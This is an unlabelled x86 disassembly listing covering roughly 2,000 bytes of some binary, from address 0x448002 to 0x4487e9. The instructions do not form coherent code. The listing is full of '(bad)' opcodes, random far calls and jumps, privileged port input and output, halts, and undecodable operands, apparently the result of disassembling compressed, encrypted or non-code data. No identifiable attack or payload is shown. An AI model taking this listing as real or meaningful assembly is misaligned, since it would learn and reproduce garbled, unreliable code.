  448002:	les    ecx,FWORD PTR [edi+esi*2+0x2084af6]
  448009:	xchg   ch,ah
  44800b:	retf   0xf7e2
  44800e:	out    dx,al
  44800f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448010:	test   eax,0x45bbba28
  448015:	popa   
  448016:	add    bh,cl
  448018:	mov    dl,0x72
  44801a:	sub    DWORD PTR [ebp+0x70],esi
  44801d:	dec    ecx
  44801e:	scas   al,BYTE PTR es:[edi]
  44801f:	pop    es
  448020:	cmp    dh,BYTE PTR [ebp+0x4f]
  448023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448024:	shl    BYTE PTR [eax],1
  448026:	push   esp
  448027:	scas   al,BYTE PTR es:[edi]
  448028:	mov    ah,0x1a
  44802a:	rcl    edx,cl
  44802c:	mov    dl,0xaf
  44802e:	test   eax,0x3b50fa43
  448033:	call   0x85d9:0x9f030ba1
  44803a:	sbb    ecx,esi
  44803c:	sub    eax,0x61bf8284
  448041:	xor    al,0x9c
  448043:	pop    ebp
  448044:	bnd jp 0x448071
  448047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448048:	in     eax,dx
  448049:	xor    bh,BYTE PTR [ebp-0x6d]
  44804c:	or     ah,bl
  44804e:	mov    esi,0xd833b204
  448053:	jne    0x4480b7
  448055:	cmp    eax,0x31aa8def
  44805a:	sbb    BYTE PTR [ebp+0x2f855031],ch
  448060:	fldenv [esi]
  448062:	call   0x29a1:0x6b79310b
  448069:	and    al,0x4
  44806b:	mov    al,ds:0x9476589a
  448070:	pop    eax
  448071:	sbb    ebp,DWORD PTR [edi+0x45]
  448074:	cdq    
  448075:	outs   dx,BYTE PTR ds:[esi]
  448076:	call   0x164e:0xad6aca8a
  44807d:	jns    0x448086
  44807f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448080:	inc    edx
  448081:	mov    esi,0x14d3c
  448086:	idiv   dh
  448088:	mov    dl,0x7d
  44808a:	sbb    bl,BYTE PTR [eax-0x37665f04]
  448090:	ror    DWORD PTR [ebx],cl
  448092:	jg     0x448079
  448094:	dec    ebp
  448095:	sub    ebp,DWORD PTR [ebp-0x65331246]
  44809b:	jmp    0x448076
  44809d:	mov    ebp,0xf5c5a543
  4480a2:	(bad)  
  4480a3:	scas   al,BYTE PTR es:[edi]
  4480a4:	sahf   
  4480a5:	call   0xbb4c:0x6333009f
  4480ac:	in     al,0x8b
  4480ae:	push   0xffffffab
  4480b0:	mov    dh,0x2
  4480b2:	adc    DWORD PTR [esi-0x589908bf],0xbed4bd55
  4480bc:	dec    esp
  4480bd:	pop    edx
  4480be:	cmc    
  4480bf:	aas    
  4480c0:	mov    dl,0xcc
  4480c2:	addr16 mov ch,0x8c
  4480c5:	lock push esi
  4480c7:	in     al,dx
  4480c8:	and    al,0xb
  4480ca:	dec    ebp
  4480cb:	dec    ecx
  4480cc:	in     al,0xa8
  4480ce:	dec    esp
  4480cf:	and    esi,DWORD PTR [eax]
  4480d1:	mov    esi,0x43fcc19a
  4480d6:	push   DWORD PTR [eax-0x58e92aa5]
  4480dc:	fucomip st,st(5)
  4480de:	add    dl,BYTE PTR [ecx-0x1d]
  4480e1:	pop    ss
  4480e2:	lods   eax,DWORD PTR ds:[esi]
  4480e3:	xor    DWORD PTR [esi+0x7f98883f],esi
  4480e9:	cmp    BYTE PTR [edx],bl
  4480eb:	cmc    
  4480ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4480ed:	and    eax,0x51afb9f4
  4480f2:	stos   BYTE PTR es:[edi],al
  4480f3:	out    0x34,eax
  4480f5:	fs into 
  4480f7:	add    BYTE PTR [edi],ah
  4480f9:	adc    al,0x85
  4480fb:	(bad)  
  4480fc:	xor    DWORD PTR [edx+0x1a],ebx
  4480ff:	dec    ebp
  448100:	push   ebx
  448101:	scas   al,BYTE PTR es:[edi]
  448102:	mov    al,ds:0x587e6d8c
  448107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448108:	jne    0x4480c3
  44810a:	ja     0x448100
  44810c:	mov    cl,0x13
  44810e:	retf   
  44810f:	stos   BYTE PTR es:[edi],al
  448110:	mov    dl,0x21
  448112:	ret    0x4f75
  448115:	inc    ebx
  448116:	mov    ebp,0x380cf0e9
  44811b:	jno    0x448120
  44811d:	mov    ds:0xbc85776e,eax
  448122:	idiv   eax
  448124:	mov    dl,0x15
  448126:	jb     0x4481a4
  448128:	push   es
  448129:	hlt    
  44812a:	push   ebp
  44812b:	out    dx,eax
  44812c:	loopne 0x4481a5
  44812e:	das    
  44812f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448130:	sub    ebp,DWORD PTR [edx+0x8]
  448133:	and    ah,0x54
  448136:	pop    edx
  448137:	mov    esi,0xfb9a68e1
  44813c:	inc    edi
  44813d:	or     BYTE PTR [edx-0x54],dh
  448140:	cli    
  448141:	mov    al,al
  448143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448144:	stc    
  448145:	and    bl,BYTE PTR [edi-0x45]
  448148:	push   edi
  448149:	(bad)  
  44814a:	jbe    0x448194
  44814c:	mov    dl,0xd0
  44814e:	xor    cl,ah
  448150:	cwde   
  448151:	fdiv   DWORD PTR [edi+0x610bc3ad]
  448157:	leave  
  448158:	repnz imul ebx,DWORD PTR [esi+0x24],0x6c
  44815d:	sub    DWORD PTR [ecx+0x35047f],edx
  448163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448164:	outs   dx,BYTE PTR ds:[esi]
  448165:	ins    DWORD PTR es:[edi],dx
  448166:	push   es
  448167:	jno    0x448155
  448169:	or     edi,DWORD PTR [ebx+0x1]
  44816c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44816d:	out    0x4d,al
  44816f:	js     0x4481b3
  448171:	out    dx,al
  448172:	test   BYTE PTR [eax+0x1c9ab47a],al
  448178:	int3   
  448179:	and    BYTE PTR [esi+0x2],bh
  44817c:	sub    al,0xa
  44817e:	mov    dh,0x8
  448180:	jb     0x448128
  448182:	test   al,0x44
  448184:	call   0x4fab:0x8bc007eb
  44818b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44818c:	aam    0x16
  44818e:	jmp    0x1daf:0xd9e33f7d
  448195:	or     esp,ecx
  448197:	dec    ebp
  448198:	loop   0x44820d
  44819a:	cdq    
  44819b:	add    dh,BYTE PTR [eax+0x26]
  44819e:	inc    ebp
  44819f:	xor    eax,0x509dc232
  4481a4:	mov    bh,0xc7
  4481a6:	(bad)  
  4481a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4481a8:	jg     0x448185
  4481aa:	mov    edi,0xb206f201
  4481af:	int3   
  4481b0:	mov    dl,0x5b
  4481b2:	out    0x72,al
  4481b4:	jne    0x4481b8
  4481b6:	mov    DWORD PTR [esp+ebp*1],edx
  4481b9:	or     ebp,DWORD PTR [esi+0x63e08d0f]
  4481bf:	xchg   esp,eax
  4481c0:	fdivr  DWORD PTR [edx+ebx*4]
  4481c3:	mov    ecx,0x3b68a9c1
  4481c8:	push   es
  4481c9:	cld    
  4481ca:	jmp    0x1e28:0x44064aa7
  4481d1:	loope  0x4481fa
  4481d3:	popf   
  4481d4:	add    dl,ch
  4481d6:	cdq    
  4481d7:	fldenv [eax+0x34]
  4481da:	popa   
  4481db:	pop    ss
  4481dc:	dec    eax
  4481dd:	shl    DWORD PTR [edx],cl
  4481df:	jg     0x4481ca
  4481e1:	or     esp,DWORD PTR [ebx+0x6b336ccd]
  4481e7:	dec    eax
  4481e8:	les    eax,FWORD PTR ds:0x1bdd629a
  4481ee:	xchg   esi,eax
  4481ef:	xor    DWORD PTR [eax+0x28],ecx
  4481f2:	or     esp,DWORD PTR [edi+0x52d2aecd]
  4481f8:	(bad)  [ecx]
  4481fa:	nop
  4481fb:	jle    0x4481ae
  4481fd:	cwde   
  4481fe:	push   eax
  4481ff:	out    0x43,al
  448201:	xor    BYTE PTR [eax],bh
  448203:	pop    ds
  448204:	(bad)  
  448205:	pop    ds
  448206:	into   
  448207:	cdq    
  448208:	mov    ebx,0x55171a97
  44820d:	sbb    dl,BYTE PTR [ebp-0x4e]
  448210:	hlt    
  448211:	retf   0xa189
  448214:	xchg   ecx,eax
  448215:	adc    ebx,DWORD PTR [edx-0x315653ca]
  44821b:	inc    esi
  44821c:	mov    ds:0xa8d6fc0a,al
  448221:	lahf   
  448222:	(bad)  
  448223:	jge    0x4481d6
  448225:	jecxz  0x4481db
  448227:	push   edi
  448228:	mov    dl,0x80
  44822a:	aas    
  44822b:	push   esp
  44822c:	shl    BYTE PTR [eax-0x7e],1
  44822f:	and    DWORD PTR [ebp+ebx*1-0x1a6e29b8],ebp
  448236:	fwait
  448237:	enter  0xb81f,0xb8
  44823b:	nop
  44823c:	pop    ebx
  44823d:	aam    0x5e
  44823f:	fs call 0x9e4ccd50
  448245:	jge    0x448253
  448247:	and    DWORD PTR [ecx-0x68],eax
  44824a:	call   0x54e9:0x1bffd455
  448251:	mov    eax,ds:0x3f92a0ac
  448256:	fidivr WORD PTR [ecx-0x2d8f4ae]
  44825c:	imul   ebp,DWORD PTR [esi],0x2
  44825f:	sbb    al,0xc5
  448261:	sbb    ebx,DWORD PTR [edx+0x47]
  448264:	xor    eax,0x867d41fc
  448269:	add    eax,0x76c04b35
  44826e:	mov    edx,0x72ca6fe8
  448273:	dec    esi
  448274:	mov    dl,0x41
  448276:	mov    BYTE PTR [eax-0x12],dl
  448279:	dec    esi
  44827a:	bound  edx,QWORD PTR [ecx+ecx*8]
  44827d:	or     esi,DWORD PTR ds:0x6ff67947
  448283:	in     eax,0x9b
  448285:	dec    ebp
  448286:	call   0x56b0:0x13de7284
  44828d:	xor    BYTE PTR [edx-0x46],al
  448290:	and    dl,bh
  448292:	or     al,ch
  448294:	loopne 0x44821e
  448296:	sbb    bh,al
  448298:	in     al,0xc2
  44829a:	sub    eax,0x84b64264
  44829f:	pop    edx
  4482a0:	and    al,0x19
  4482a2:	cwde   
  4482a3:	into   
  4482a4:	or     al,0x6b
  4482a6:	fs inc edi
  4482a8:	and    bh,bl
  4482aa:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4482ac:	fcom   DWORD PTR [ecx+0x7a]
  4482af:	mov    BYTE PTR [esi],dh
  4482b1:	aam    0xd2
  4482b3:	shl    BYTE PTR [edx+0x7cb614b],0x9d
  4482ba:	cmp    DWORD PTR ds:0x75e00b1a,eax
  4482c0:	mov    ?,ebp
  4482c2:	(bad)  
  4482c3:	fsub   DWORD PTR [edx-0x21]
  4482c6:	call   0x7764:0xf1b3bafb
  4482cd:	push   0x4c
  4482cf:	mov    ecx,0xe7c12551
  4482d4:	jnp    0x448322
  4482d6:	mov    eax,ds:0x95aa924f
  4482db:	js     0x448268
  4482dd:	(bad)  
  4482de:	mov    ds:0x620f1e67,al
  4482e3:	aaa    
  4482e4:	or     DWORD PTR [ebx],ecx
  4482e6:	xor    ch,dh
  4482e8:	fs inc ebp
  4482ea:	enter  0x3776,0x9d
  4482ee:	call   0xa6673590
  4482f3:	mov    WORD PTR [edx],?
  4482f5:	sub    al,0xa4
  4482f7:	not    al
  4482f9:	or     esp,DWORD PTR [eax]
  4482fb:	push   edx
  4482fc:	pushf  
  4482fd:	dec    ebx
  4482fe:	mov    esi,0x9970d41c
  448303:	inc    esp
  448304:	xlat   BYTE PTR ds:[ebx]
  448305:	repz in al,dx
  448307:	pop    es
  448308:	pusha  
  448309:	xor    dl,0x1f
  44830c:	add    BYTE PTR [ecx],ah
  44830e:	sub    DWORD PTR [edi-0x21a07da3],esp
  448314:	ss out dx,al
  448316:	sbb    al,BYTE PTR ds:0xfe45f8b2
  44831c:	lods   eax,DWORD PTR ds:[esi]
  44831d:	fld    TBYTE PTR [ebx+0x68]
  448320:	test   eax,0xd1e1b08
  448325:	push   ecx
  448326:	dec    eax
  448327:	cmc    
  448328:	cmp    bl,ah
  44832a:	test   al,0x1
  44832c:	mov    al,0x61
  44832e:	pop    es
  44832f:	inc    eax
  448330:	xor    al,0xd2
  448332:	ins    DWORD PTR es:[edi],dx
  448333:	sub    BYTE PTR [edi+0x4b],dl
  448336:	mov    ah,0xd8
  448338:	mov    bl,0xe6
  44833a:	inc    esp
  44833b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44833c:	push   ds
  44833d:	aam    0xd
  44833f:	adc    BYTE PTR [edx+eiz*4],bh
  448342:	cwde   
  448343:	cwde   
  448344:	mov    dl,0xc2
  448346:	outs   dx,BYTE PTR ds:[esi]
  448347:	add    al,0x43
  448349:	dec    ecx
  44834a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44834b:	sahf   
  44834c:	shl    ebp,cl
  44834e:	(bad)  
  44834f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448350:	xor    ecx,ecx
  448352:	cdq    
  448353:	int    0xa1
  448355:	cmp    BYTE PTR [ebp-0x4c9c4ac7],al
  44835b:	hlt    
  44835c:	and    ebx,DWORD PTR [eax+ebp*1]
  44835f:	mov    esi,edi
  448361:	jle    0x4482fc
  448363:	iret   
  448364:	ss retf 0x9543
  448368:	adc    bl,al
  44836a:	push   edx
  44836b:	pop    esp
  44836c:	ret    
  44836d:	pusha  
  44836e:	out    dx,eax
  44836f:	mov    ecx,0xd3f325b2
  448374:	jb     0x44833d
  448376:	xchg   edi,eax
  448377:	les    esi,FWORD PTR [esi+0xb]
  44837a:	jo     0x448356
  44837c:	jae    0x4483e5
  44837e:	mov    al,ds:0x9a35255f
  448383:	sub    BYTE PTR [esp+ebp*2-0x3dd45a3e],dh
  44838a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44838b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44838c:	adc    edx,DWORD PTR [esi-0x25]
  44838f:	add    cl,BYTE PTR [edx]
  448391:	enter  0x9a0a,0xb0
  448395:	push   ecx
  448396:	jns    0x448359
  448398:	and    DWORD PTR [esi+ebp*4+0x4a161e20],0xe2601936
  4483a3:	mov    ecx,DWORD PTR [edi-0x7e]
  4483a6:	cld    
  4483a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4483a8:	popf   
  4483a9:	int3   
  4483aa:	sbb    eax,0x281e7281
  4483af:	xchg   edi,eax
  4483b0:	mov    dl,0xba
  4483b2:	push   eax
  4483b3:	or     esp,DWORD PTR [ebx+0x44a605e0]
  4483b9:	or     BYTE PTR [ecx],dl
  4483bb:	lods   al,BYTE PTR ds:[esi]
  4483bc:	ret    
  4483bd:	stos   BYTE PTR es:[edi],al
  4483be:	mov    DWORD PTR [esi+0x4a],eax
  4483c1:	sub    al,0x3c
  4483c3:	fidiv  DWORD PTR [ecx-0x7b021e61]
  4483c9:	mov    al,ds:0x814d37e6
  4483ce:	mov    esp,DWORD PTR [edi-0x763caf4]
  4483d4:	nop
  4483d5:	add    al,0x6a
  4483d7:	cmc    
  4483d8:	mov    bl,0xba
  4483da:	inc    esi
  4483db:	in     eax,0x36
  4483dd:	and    edi,DWORD PTR [esi]
  4483df:	mov    ebx,0x34db9bf2
  4483e4:	pop    edi
  4483e5:	or     edi,DWORD PTR [edi+ecx*2-0x40df5390]
  4483ec:	stos   DWORD PTR es:[edi],eax
  4483ed:	xor    dl,BYTE PTR [eax+edi*2+0x73bb796]
  4483f4:	dec    edi
  4483f5:	cmp    esi,DWORD PTR [eax-0x1c]
  4483f8:	std    
  4483f9:	or     ecx,DWORD PTR [ecx+0x55e97749]
  4483ff:	push   ebp
  448400:	sbb    ebp,DWORD PTR [ecx-0x69ea0166]
  448406:	imul   esp,DWORD PTR [eax],0xa73e7261
  44840c:	mul    DWORD PTR [edi+0x25]
  44840f:	mov    ecx,0x74e0553
  448414:	mov    bl,0xc7
  448416:	stos   BYTE PTR es:[edi],al
  448417:	das    
  448418:	or     al,0x7
  44841a:	mov    al,0x2d
  44841c:	ja     0x4483d1
  44841e:	bound  ebp,QWORD PTR [esi+0x7a8d0b35]
  448424:	enter  0x5069,0x89
  448428:	mov    esp,0x12469a36
  44842d:	adc    BYTE PTR [edx],al
  44842f:	adc    DWORD PTR [edx+0x1da7cda8],eax
  448435:	push   edx
  448436:	sub    DWORD PTR [esi],0xffffffd1
  448439:	xchg   BYTE PTR [edx-0x13814b99],cl
  44843f:	xor    eax,0x5d324440
  448444:	sbb    BYTE PTR [ebx],cl
  448446:	arpl   WORD PTR [eax+0x3c],bx
  448449:	mov    WORD PTR [edi-0x13],?
  44844c:	dec    eax
  44844d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44844e:	xchg   edi,ecx
  448450:	or     edx,DWORD PTR [ebx+0x20c0f41a]
  448456:	lods   eax,DWORD PTR ds:[esi]
  448457:	mov    eax,ds:0x572aedd4
  44845c:	aas    
  44845d:	jo     0x4484a0
  44845f:	mov    edx,0xe3d565bc
  448464:	jbe    0x448401
  448466:	add    eax,0x78df4627
  44846b:	mov    ebp,0xed3378b2
  448470:	push   0x5e
  448472:	jns    0x44844a
  448474:	retf   
  448475:	or     ebp,DWORD PTR [edx+0x6a31d0ab]
  44847b:	call   0xc3ddadf0
  448480:	sub    DWORD PTR [ecx-0x7c],esp
  448483:	mov    ?,edx
  448485:	jecxz  0x44842e
  448487:	push   eax
  448488:	lea    edx,[edi]
  44848a:	push   ds
  44848b:	add    DWORD PTR [edx],edx
  44848d:	mov    edi,esp
  44848f:	jo     0x448457
  448491:	shl    BYTE PTR [esp+ebp*8],cl
  448494:	mov    dl,0xe6
  448496:	jb     0x44842e
  448498:	imul   esp,DWORD PTR [ebp+0x69],0x80bc860
  44849f:	mov    esi,0xbe60938
  4484a4:	push   edx
  4484a5:	xchg   esp,eax
  4484a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4484a7:	mov    ds,WORD PTR [eax-0x59]
  4484aa:	pop    es
  4484ab:	setbe  BYTE PTR [edi-0x454e2c77]
  4484b2:	ds or  eax,0x5938fb26
  4484b8:	gs or  ecx,eax
  4484bb:	pop    ebp
  4484bc:	mov    ds:0x2eb0d2a4,al
  4484c1:	dec    edi
  4484c2:	call   0x27f1:0x3c63f219
  4484c9:	fs js  0x448473
  4484cc:	inc    eax
  4484cd:	test   BYTE PTR [esi-0x622619f5],dh
  4484d3:	sbb    BYTE PTR [ecx-0x4aa1cbbd],cl
  4484d9:	fadd   st,st(4)
  4484db:	adc    DWORD PTR [ecx],ecx
  4484dd:	add    al,0xb1
  4484df:	daa    
  4484e0:	sub    eax,0x752f6bff
  4484e5:	or     ebx,esp
  4484e7:	call   0x5556:0x10f06674
  4484ee:	call   0x2c53:0xcb052864
  4484f5:	jno    0x4484bf
  4484f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4484f8:	mov    ch,0x47
  4484fa:	dec    edx
  4484fb:	nop
  4484fc:	pop    ecx
  4484fd:	push   ss
  4484fe:	in     eax,0x81
  448500:	mov    dl,0x7
  448502:	(bad)  
  448503:	in     al,0xd7
  448505:	sar    BYTE PTR [edx],0x20
  448508:	sub    BYTE PTR [ebx],cl
  44850a:	stc    
  44850b:	xchg   esp,eax
  44850c:	mov    ecx,0x8c47533c
  448511:	mov    ds,WORD PTR [edx-0x3179f7af]
  448517:	fdiv   QWORD PTR [ebx+eax*1-0x18864427]
  44851e:	ja     0x4484c4
  448520:	bound  edx,QWORD PTR [ecx]
  448522:	xor    ecx,DWORD PTR [esi+eax*1-0x35]
  448526:	(bad)  
  448527:	jge    0x4484cc
  448529:	sub    bl,BYTE PTR [edx-0x4db0de69]
  44852f:	xor    ebx,esp
  448531:	mov    dh,0x9b
  448533:	popf   
  448534:	iret   
  448535:	sbb    BYTE PTR [edx],0x7f
  448538:	pop    ds
  448539:	les    esp,FWORD PTR [edi-0x2dfbd0e7]
  44853f:	mov    ds:0xd3a30b29,al
  448544:	mov    edx,0x986323d8
  448549:	add    eax,0x17338b42
  44854e:	mov    edx,0xef4685f4
  448553:	div    BYTE PTR [ebx+0x4e8ce7c9]
  448559:	sub    ecx,eax
  44855b:	or     edi,DWORD PTR [esi+0x56]
  44855e:	pop    ebx
  44855f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448560:	pop    esi
  448561:	sbb    BYTE PTR [ecx-0x23],cl
  448564:	imul   DWORD PTR [eax-0x16]
  448567:	pop    ecx
  448568:	and    dl,BYTE PTR [eax-0x66]
  44856b:	int    0xb3
  44856d:	jecxz  0x44859f
  44856f:	sahf   
  448570:	jb     0x4485df
  448572:	inc    ebx
  448573:	inc    ebp
  448574:	iret   
  448575:	adc    eax,0x8b9a5a14
  44857a:	sbb    cl,dl
  44857c:	pop    ds
  44857d:	mov    ecx,0x6eb2e0e1
  448582:	(bad)  
  448583:	jbe    0x4485d2
  448585:	inc    esi
  448586:	jmp    0x407b:0xe6157e64
  44858d:	dec    ebx
  44858e:	retf   
  44858f:	rcr    DWORD PTR [edi+ebx*1+0x34],1
  448593:	lods   eax,DWORD PTR ds:[esi]
  448594:	mov    cl,0x23
  448596:	mov    dh,BYTE PTR [ecx]
  448598:	pop    es
  448599:	jmp    0x4485da
  44859b:	aas    
  44859c:	in     al,dx
  44859d:	xor    al,0x7
  44859f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4485a0:	inc    esp
  4485a1:	das    
  4485a2:	outs   dx,BYTE PTR ds:[esi]
  4485a3:	sbb    DWORD PTR [ecx-0x4f21b531],edx
  4485a9:	pop    eax
  4485aa:	xchg   ecx,eax
  4485ab:	add    BYTE PTR [edx-0x32],bh
  4485ae:	je     0x448577
  4485b0:	test   eax,edi
  4485b2:	(bad)  
  4485b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4485b4:	loopne 0x448560
  4485b6:	mov    bh,BYTE PTR [ebx-0x23e92c11]
  4485bc:	push   esp
  4485bd:	hlt    
  4485be:	call   0x6903:0x9201c4b1
  4485c5:	test   ah,al
  4485c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4485c8:	pop    esp
  4485c9:	sub    ecx,DWORD PTR [edi+0x49ef234]
  4485cf:	pushf  
  4485d0:	mov    dl,0x9
  4485d2:	or     eax,0x6a3e59fc
  4485d7:	fwait
  4485d8:	clc    
  4485d9:	jnp    0x44855c
  4485db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4485dc:	sub    dl,cl
  4485de:	mov    ebp,0x88d67418
  4485e3:	push   ebx
  4485e4:	mov    dl,0xa3
  4485e6:	test   DWORD PTR [eax+0x2bd303a4],ecx
  4485ec:	mov    ecx,DWORD PTR [ebx]
  4485ee:	shr    BYTE PTR [eax],0x95
  4485f1:	aad    0x1c
  4485f3:	in     al,0x6b
  4485f5:	mov    al,ds:0x7f76959a
  4485fa:	retf   
  4485fb:	pop    es
  4485fc:	inc    eax
  4485fd:	or     ah,BYTE PTR es:[ebp-0x11587cf1]
  448604:	sbb    eax,0x78adaf3
  448609:	aam    0xa6
  44860b:	lods   eax,DWORD PTR ds:[esi]
  44860c:	ror    BYTE PTR [edi+edx*4+0x66085760],cl
  448613:	or     eax,0xa0439b61
  448618:	int    0x43
  44861a:	sbb    al,0xd4
  44861c:	pop    ebx
  44861d:	stos   DWORD PTR es:[edi],eax
  44861e:	jb     0x448613
  448620:	(bad)  
  448622:	call   0x12a6:0x4f0359ba
  448629:	mov    ds:0x2514a60d,al
  44862e:	cli    
  44862f:	sahf   
  448630:	(bad)  
  448631:	fs ins DWORD PTR es:[edi],dx
  448633:	outs   dx,DWORD PTR ds:[esi]
  448634:	push   es
  448635:	mov    eax,ds:0xf1698e9a
  44863a:	iret   
  44863b:	adc    al,0xfd
  44863d:	loop   0x448662
  44863f:	cwde   
  448640:	sbb    WORD PTR [ebx-0x33c3926f],0x2f0d
  448649:	sub    ecx,edi
  44864b:	dec    edx
  44864c:	mov    dl,0x1a
  44864e:	sbb    ebx,DWORD PTR [ebx+0x1fcbf935]
  448654:	enter  0x78fb,0xd5
  448658:	xor    cl,BYTE PTR [ebx]
  44865a:	aam    0x7d
  44865c:	imul   ecx,DWORD PTR [edi-0x5],0x9a684ea3
  448663:	call   0x2236:0x138f3da9
  44866a:	nop
  44866b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44866c:	push   ebx
  44866d:	and    eax,0x787644f6
  448672:	pop    esp
  448673:	nop
  448674:	mov    dl,0xc0
  448676:	not    DWORD PTR [esi-0x6d12d649]
  44867c:	dec    eax
  44867d:	or     edx,DWORD PTR [ebp-0x615cdbd]
  448683:	sahf   
  448684:	aaa    
  448685:	ret    
  448686:	call   0xccac:0xd952ec00
  44868d:	jae    0x44868b
  44868f:	mov    ds:0xc97e0f1f,eax
  448694:	cdq    
  448695:	mov    esp,edx
  448697:	js     0x4486d8
  448699:	mov    dh,0xa3
  44869b:	les    edx,FWORD PTR cs:[esi+eax*2]
  44869f:	dec    ebp
  4486a0:	jb     0x4486ce
  4486a2:	and    bx,WORD PTR [esi+eax*1-0x51158e1]
  4486aa:	xchg   DWORD PTR [ecx+0x11b7fd30],ebp
  4486b0:	mov    bl,0x4d
  4486b2:	cmc    
  4486b3:	jg     0x448693
  4486b5:	aaa    
  4486b6:	add    BYTE PTR [esi+0x4d],al
  4486b9:	jecxz  0x448690
  4486bb:	mov    ebx,0x510b196e
  4486c0:	jl     0x4486cd
  4486c2:	xor    eax,DWORD PTR [ecx+eax*4+0x4609aca8]
  4486c9:	jp     0x448665
  4486cb:	pop    ebp
  4486cc:	pop    ebx
  4486cd:	and    DWORD PTR [edx-0x2f],ebx
  4486d0:	(bad)  
  4486d2:	mov    DWORD PTR [edi+0x7b84d0cc],esp
  4486d8:	or     ebx,DWORD PTR [eax+0x3b2495d]
  4486de:	xchg   ebx,eax
  4486df:	xor    eax,0xf0d9775e
  4486e4:	inc    ecx
  4486e5:	or     ecx,ebx
  4486e7:	dec    ebp
  4486e8:	jns    0x448675
  4486ea:	test   eax,0x9d9a1d2a
  4486ef:	inc    esi
  4486f0:	retf   
  4486f1:	mov    ebx,0x2cc29b6d
  4486f6:	cmp    al,dl
  4486f8:	mov    ds:0xa957b778,al
  4486fd:	or     esi,DWORD PTR [edx]
  4486ff:	adc    BYTE PTR [ebx+eax*2-0x6a81cea6],ch
  448706:	xchg   ebx,eax
  448707:	cmp    ebp,edx
  448709:	pusha  
  44870a:	cmp    ch,BYTE PTR [eax]
  44870c:	js     0x4486a5
  44870e:	sbb    DWORD PTR [esi],esi
  448710:	sub    BYTE PTR [ecx-0x718ad8cf],bl
  448716:	aam    0xa7
  448718:	mov    edx,0x2bdc7a8b
  44871d:	popf   
  44871e:	imul   edi,DWORD PTR [ebx+0x1f37ca8c],0xda4b8bc4
  448728:	adc    edi,DWORD PTR ds:0x2d3b6ff0
  44872e:	jmp    0x1a74887e
  448733:	jge    0x448747
  448735:	aaa    
  448736:	inc    ebx
  448737:	stc    
  448738:	push   edx
  448739:	(bad)  
  44873a:	in     eax,0xc
  44873c:	scas   eax,DWORD PTR es:[edi]
  44873d:	dec    esi
  44873e:	iret   
  44873f:	mov    dl,0xf2
  448741:	scas   al,BYTE PTR es:[edi]
  448742:	ins    BYTE PTR es:[edi],dx
  448743:	stos   BYTE PTR es:[edi],al
  448744:	jle    0x44877e
  448746:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  448748:	pusha  
  448749:	lock fs das 
  44874c:	and    al,0x99
  44874e:	aaa    
  44874f:	arpl   WORD PTR [edx-0x1035c92f],si
  448755:	mov    ebp,DWORD PTR [esi]
  448757:	mov    eax,0xfa50b22
  44875c:	mov    BYTE PTR [edi],dh
  44875e:	fs cmc 
  448760:	rol    dh,cl
  448762:	call   0x46ba:0x18c5c048
  448769:	push   edx
  44876a:	inc    edx
  44876b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44876c:	pushf  
  44876d:	(bad)  
  44876f:	fcomp  QWORD PTR [eax-0x71]
  448772:	pop    ebp
  448773:	cld    
  448774:	mov    dl,0x3a
  448776:	cmp    BYTE PTR [edi],0xe8
  448779:	cs sbb bh,0xe5
  44877d:	or     edi,DWORD PTR [ecx+0x2f]
  448780:	inc    esi
  448781:	and    esp,DWORD PTR [eax-0x650bd858]
  448787:	(bad)  
  448788:	add    al,0x1a
  44878a:	mov    cl,dl
  44878c:	add    DWORD PTR [edi+0x46],ecx
  44878f:	mov    ebx,0x67bacbca
  448794:	stos   BYTE PTR es:[edi],al
  448795:	jne    0x448776
  448797:	pushf  
  448798:	sbb    ecx,edi
  44879a:	call   0x9b78:0xe06fa568
  4487a1:	xor    DWORD PTR [edx-0x59],edx
  4487a4:	shl    BYTE PTR [esi+eax*4+0x20],1
  4487a8:	dec    ebp
  4487a9:	mov    cl,0x4
  4487ab:	scas   eax,DWORD PTR es:[edi]
  4487ac:	mov    dl,0x12
  4487ae:	aam    0xec
  4487b0:	or     ch,BYTE PTR [ebp+0xb799249]
  4487b6:	std    
  4487b7:	inc    eax
  4487b8:	inc    ebp
  4487b9:	add    DWORD PTR [edi-0x1e],edi
  4487bc:	sbb    al,0x67
  4487be:	call   0xa776:0x91cbc449
  4487c5:	push   cs
  4487c6:	and    ah,BYTE PTR [edi+0x3eefbab1]
  4487cc:	sub    eax,0xb22fc921
  4487d1:	loopne 0x44882c
  4487d3:	(bad)  
  4487d4:	push   esi
  4487d5:	mov    ah,0x8e
  4487d7:	mov    BYTE PTR [edi-0x49e4d934],0x7b
  4487de:	out    dx,eax
  4487df:	jae    0x4487f5
  4487e1:	retf   
  4487e2:	call   0x4530:0x1740d544
  4487e9:	xchg   esi,eax
